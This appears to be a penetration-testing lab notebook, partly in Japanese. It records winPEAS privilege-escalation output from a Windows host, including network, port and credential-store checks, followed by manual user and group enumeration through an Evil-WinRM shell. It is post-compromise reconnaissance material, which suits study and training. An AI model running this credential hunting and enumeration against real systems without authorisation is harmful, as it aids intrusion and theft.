    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
    Chelsio Communications iSCSI Controller - 10.0.10011.16384 [Chelsio Communications]: \\.\GLOBALROOT\SystemRoot\System32\drivers\cht4sx64.sys
    Intel(R) Rapid Storage Technology driver (inbox) - 15.44.0.1010 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAVC.sys
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadfcoei.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 11.0.247.8000 01/26/2016 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxfcoe.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 11.4.225.8009 11/15/2017 WS2K12 64 bit x64 [Broadcom]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxstor.sys
    QLogic iSCSI offload driver - 8.33.5.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qeois.sys
    QLogic Fibre Channel Stor Miniport Driver - 9.1.15.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql2300i.sys
    QLA40XX iSCSI Host Bus Adapter - 2.1.5.0 (STOREx wx64) [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql40xx2i.sys
    QLogic FCoE Stor Miniport Inbox Driver - 9.1.11.3 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qlfcoei.sys
    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadi.sys
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys
    VMware PVSCSI StorPort driver (64-bit) - 1.3.25.0 build-19569981 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\pvscsi.sys
    SmartRAID, SmartHBA PQI Storport Driver - 1.50.0.0 [Microsemi Corportation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SmartSAMD.sys
    VMware Guest Introspection Driver - 12.1.0.0 build-19947491 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsepflt.sys
    QLogic FCoE offload driver - 8.33.4.2 [Cavium, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qefcoe.sys
    QLogic iSCSI offload driver - 7.14.7.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxois.sys
    QLogic FCoE Offload driver - 7.14.15.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxfcoe.sys
    VMware Raw Disk Helper Driver - 1.1.7.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmrawdsk.sys
    VMware Guest Introspection WFP Network Filter Driver - 12.1.0.0 build-19947491 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vnetWFP.sys
    VMware Pointing PS/2 Device Driver - 12.5.12.0 build-18967789 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys
    VMware SVGA 3D - 9.17.04.0001 - build-20112898 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp_loader.sys
    VMware SVGA 3D - 9.17.04.0001 - build-20112898 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys
    VMware server memory controller - 7.5.7.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys
    Intel(R) Gigabit Adapter - 12.15.22.6 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\e1i63x64.sys


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Network Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Shares
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate Network Mapped Drives (WMI)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Host File

ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Ifaces and known hosts
È The masks are only for the IPv4 addresses 
    Ethernet1[00:50:56:8A:F7:83]: 172.16.115.202 / 255.255.255.0
        Gateways: 172.16.115.254
        DNSs: 172.16.115.200
        Known hosts:
          172.16.115.200        00-50-56-8A-6B-EC     Dynamic
          172.16.115.206        00-50-56-8A-24-EE     Dynamic
          172.16.115.254        00-00-00-00-00-00     Invalid
          172.16.115.255        FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static


ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               135           0.0.0.0               0               Listening         876             svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               8080          0.0.0.0               0               Listening         3944            java
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         500             wininit
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1112            svchost
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1600            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         644             lsass
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         644             lsass
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         624             services
  TCP        172.16.115.202        135           172.16.115.206        55532           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        55754           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        56912           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59485           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59520           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59521           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59522           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59523           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59524           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59525           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59526           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59527           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59529           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59530           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59531           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59532           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59533           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59534           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59535           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59536           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59561           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59597           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59598           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59599           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59600           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59601           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59602           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59603           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59604           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59606           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59607           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59608           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59609           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59610           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59611           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59613           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59614           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        59696           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        61560           Established       876             svchost
  TCP        172.16.115.202        135           172.16.115.206        61780           Established       876             svchost
  TCP        172.16.115.202        139           0.0.0.0               0               Listening         4               System

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        135           [::]                                        0               Listening         876             svchost
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        8080          [::]                                        0               Listening         3944            java
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49664         [::]                                        0               Listening         500             wininit
  TCP        [::]                                        49665         [::]                                        0               Listening         1112            svchost
  TCP        [::]                                        49666         [::]                                        0               Listening         1600            svchost
  TCP        [::]                                        49667         [::]                                        0               Listening         644             lsass
  TCP        [::]                                        49668         [::]                                        0               Listening         644             lsass
  TCP        [::]                                        49669         [::]                                        0               Listening         624             services
  TCP        [::1]                                       5985          [::1]                                       53232           Established       4               System
  TCP        [::1]                                       53232         [::1]                                       5985            Established       1892            C:\Windows\system32\wsmprovhost.exe

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current UDP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               123           *:*                            488               svchost
  UDP        0.0.0.0               5353          *:*                            1080              svchost
  UDP        0.0.0.0               5355          *:*                            1080              svchost
  UDP        127.0.0.1             50540         *:*                            2088              svchost
  UDP        127.0.0.1             54491         *:*                            1364              svchost
  UDP        127.0.0.1             58094         *:*                            316               C:\Users\b.martin\winPEASx64.exe
  UDP        127.0.0.1             63805         *:*                            644               lsass
  UDP        127.0.0.1             64764         *:*                            1324              svchost
  UDP        172.16.115.202        137           *:*                            4                 System
  UDP        172.16.115.202        138           *:*                            4                 System

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        123           *:*                            488               svchost

ÉÍÍÍÍÍÍÍÍÍÍ¹ Firewall Rules
È Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: DOMAIN
    FirewallEnabled (Domain):    True
    FirewallEnabled (Private):    True
    FirewallEnabled (Public):    True
    DENY rules:
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ DNS cached --limit 70--
    Entry                                 Name                                  Data
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        DisableCachingOfSSLPages                  0
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        PrivacyAdvanced                           1
  HKCU        SecureProtocols                           2688
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU        CertificateRevocation                     1
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
  HKLM        CodeBaseSearchPath                        CODEBASE
  HKLM        EnablePunycode                            1
  HKLM        MinorVersion                              0
  HKLM        WarnOnIntranet                            1

  Zone Maps
  No URLs configured

  Zone Auth Settings
  No Zone Auth Settings

ÉÍÍÍÍÍÍÍÍÍÍ¹ Internet Connectivity
È Checking if internet access is possible via different methods 
    HTTP (80) Access: Not Accessible
  [X] Exception:       Error: A task was canceled.
    HTTPS (443) Access: Not Accessible
  [X] Exception:       Error: TCP connect timed out
    HTTPS (443) Access by Domain Name: Not Accessible
  [X] Exception:       Error: A task was canceled.
    DNS (53) Access: Not Accessible
  [X] Exception:       Error: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond
    ICMP (ping) Access: Not Accessible
  [X] Exception:       Error: Ping failed: TimedOut

ÉÍÍÍÍÍÍÍÍÍÍ¹ Hostname Resolution
È Checking if the hostname can be resolved externally 
  [X] Exception:     Error during hostname check: An error occurred while sending the request.


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Active Directory Quick Checks ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ gMSA readable managed passwords
È Look for Group Managed Service Accounts you can read (msDS-ManagedPassword) https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/gmsa.html
  [X] Exception: An operations error occurred.


ÉÍÍÍÍÍÍÍÍÍÍ¹ AD CS misconfigurations for ESC
È  https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html
È Check for ADCS misconfigurations in the local DC registry
  [-] Host is not a domain controller. Skipping ADCS Registry check
È 
If you can modify a template (WriteDacl/WriteOwner/GenericAll), you can abuse ESC4
  [X] Exception: An operations error occurred.



ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Cloud Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
Learn and practice cloud hacking in training.hacktricks.xyz
AWS EC2?                                No   
Azure VM?                               No   
Azure Tokens?                           No   
Google Cloud Platform?                  No   
Google Workspace Joined?                No   
Google Cloud Directory Sync?            No   
Google Password Sync?                   No   


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Windows Credentials ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Windows Vault
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault
  [ERROR] Unable to enumerate vaults. Error (0x1061)
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Credential manager
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): A specified logon session does not exist. It may already have been terminated'
Please run: 
cmdkey /list

ÉÍÍÍÍÍÍÍÍÍÍ¹ Saved RDP connections
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Remote Desktop Server/Client Settings
  RDP Server Settings
    Network Level Authentication            :       
    Block Clipboard Redirection             :       
    Block COM Port Redirection              :       
    Block Drive Redirection                 :       
    Block LPT Port Redirection              :       
    Block PnP Device Redirection            :       
    Block Printer Redirection               :       
    Allow Smart Card Redirection            :       

  RDP Client Settings
    Disable Password Saving                 :       True
    Restricted Remote Administration        :       False

ÉÍÍÍÍÍÍÍÍÍÍ¹ Recently run commands
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for RDCMan Settings Files
È Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#remote-desktop-credential-manager
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Kerberos tickets
È  https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/index.html
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for saved Wifi credentials
  [X] Exception: Unable to load DLL 'wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)
Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'
No saved Wifi credentials found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking AppCmd.exe
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#appcmdexe
    Not Found
      You must be an administrator to run this check

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking SSClient.exe
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#scclient--sccm
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating SSCM - System Center Configuration Manager settings

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Security Packages Credentials
  [X] Exception: Couldn't parse nt_resp. Len: 0 Message bytes: 4e544c4d535350000300000001000100620000000000000063000000000000005800000000000000580000000a000a00580000000000000063000000058a80a20a0063450000000f0a65f631666c30eb63370dafecfb66345300520056003200320000


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Browsers Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Firefox history
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Chrome
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Chrome DBs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Chrome history
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Chrome bookmarks
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Opera
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Brave Browser
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Internet Explorer (unsupported)
    Info: if no credentials were listed, you might need to close the browser and try again.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current IE tabs
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException: The server process could not be started because the configured identity is incorrect. Check the username and password. (Exception from HRESULT: 0x8000401A)
   --- End of inner exception stack trace ---
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)
   at winPEAS.KnownFileCreds.Browsers.InternetExplorer.GetCurrentIETabs()
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in IE history
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history


ÉÍÍÍÍÍÍÍÍÍÍ¹ IE history -- limit 50

    http://go.microsoft.com/fwlink/p/?LinkId=255141

ÉÍÍÍÍÍÍÍÍÍÍ¹ IE favorites
    Not Found


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting files and registry ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty Sessions
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty SSH Host keys
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ SSH keys in registry
È If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#ssh-keys-in-registry
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ SuperPutty configuration files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Office 365 endpoints synced by OneDrive.

    SID: S-1-5-19
   =================================================================================================

    SID: S-1-5-20
   =================================================================================================

    SID: S-1-5-21-1151949782-2971075788-3621847170-1000
   =================================================================================================

    SID: S-1-5-21-1166644149-215888741-1708426353-1104
   =================================================================================================

    SID: S-1-5-18
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Cloud Credentials
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Unattend Files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for common SAM & SYSTEM backups

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for McAfee Sitelist.xml Files

ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached GPP Passwords

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible regs with creds
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible password files in users homes
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching for Oracle SQL Developer config files


ÉÍÍÍÍÍÍÍÍÍÍ¹ Slack files & directories
  note: check manually if something is found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for LOL Binaries and Scripts (can be slow)
È  https://lolbas-project.github.io/
   [!] Check skipped, if you want to run it, please specify '-lolbas' argument

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Outlook download files


ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating machine and user certificate files


ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching known files that can contain creds in home
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for documents --limit 100--
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Office Most Recent Files -- limit 50

  Last Access Date           User                                           Application           Document

ÉÍÍÍÍÍÍÍÍÍÍ¹ Recent files --limit 70--
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking inside the Recycle Bin for creds files
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    Not Found

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching hidden files or folders in C:\Users home (can be slow)

     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users
     C:\Users\Default
     C:\Users\All Users
     C:\Users\All Users\ntuser.pol

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching interesting files in other users home directories (can be slow)

  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\Users\b.martin\winPEASx64.exe": b.martin [Allow: AllAccess]

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Linux shells/distributions - wsl.exe, bash.exe

```


---
---

## Manual

### ユーザー

#### martin


```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents> whoami /groups /fo csv | ConvertFrom-Csv | Select-Object "Group Name"

Group Name
----------
Everyone
BUILTIN\Remote Management Users
BUILTIN\Users
NT AUTHORITY\NETWORK
NT AUTHORITY\Authenticated Users
NT AUTHORITY\This Organization
NT AUTHORITY\NTLM Authentication
Mandatory Label\Medium Mandatory Level


*Evil-WinRM* PS C:\Users\b.martin\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\b.martin\Documents> 


```

#### other

- JenkinsとIISが気になる
```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents> Get-LocalUser

Name               Enabled Description
----               ------- -----------
Administrator      True    Built-in account for administering the computer/domain
DefaultAccount     False   A user account managed by the system.
Guest              False   Built-in account for guest access to the computer/domain
jenkins            True
WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scenarios.


*Evil-WinRM* PS C:\Users\b.martin\Documents> Get-LocalGroup
 

Name                                Description
----                                -----------
Access Control Assistance Operators Members of this group can remotely query authorization attributes and permissions for resources on this computer.
Administrators                      Administrators have complete and unrestricted access to the computer/domain
Backup Operators                    Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
Certificate Service DCOM Access     Members of this group are allowed to connect to Certification Authorities in the enterprise
Cryptographic Operators             Members are authorized to perform cryptographic operations.
Device Owners                       Members of this group can change system-wide settings.
Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this machine.
Event Log Readers                   Members of this group can read event logs from local machine
Guests                              Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of Hyper-V.
IIS_IUSRS                           Built-in group used by Internet Information Services.
Network Configuration Operators     Members in this group can have some administrative privileges to manage configuration of networking features
Performance Log Users               Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
Performance Monitor Users           Members of this group can access performance counter data locally and remotely
Power Users                         Power Users are included for backwards compatibility and possess limited administrative powers
Print Operators                     Members can administer printers installed on domain controllers
RDS Endpoint Servers                Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Sessio...
RDS Management Servers              Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers ...
RDS Remote Access Servers           Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This gr...
Remote Desktop Users                Members in this group are granted the right to logon remotely
Remote Management Users             Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
Replicator                          Supports file replication in a domain
Storage Replica Administrators      Members of this group have complete and unrestricted access to all features of Storage Replica.
System Managed Accounts Group       Members of this group are managed by the system.

```

#### 詳細調査→特になし

jenkins -> 特になんでもない
```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents> net user jenkins
User name                    jenkins
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/9/2024 12:23:12 PM
Password expires             Never
Password changeable          10/10/2024 12:23:12 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/13/2024 2:23:46 AM

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.

```

- IIS_IUSRSグループ→特になし
```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents> get-localgroupmember "IIS_IUSRS"

ObjectClass Name              PrincipalSource
----------- ----              ---------------
Group       NT AUTHORITY\IUSR Unknown

```

---

### システム情報 -> windows 10

```powershell
*Evil-WinRM* PS C:\Users> systeminfo
systeminfo.exe : ERROR: Access denied
    + CategoryInfo          : NotSpecified: (ERROR: Access denied:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

*Evil-WinRM* PS C:\Users> get-computerinfo


WindowsBuildLabEx                                       : 17763.1.amd64fre.rs5_release.180914-1434
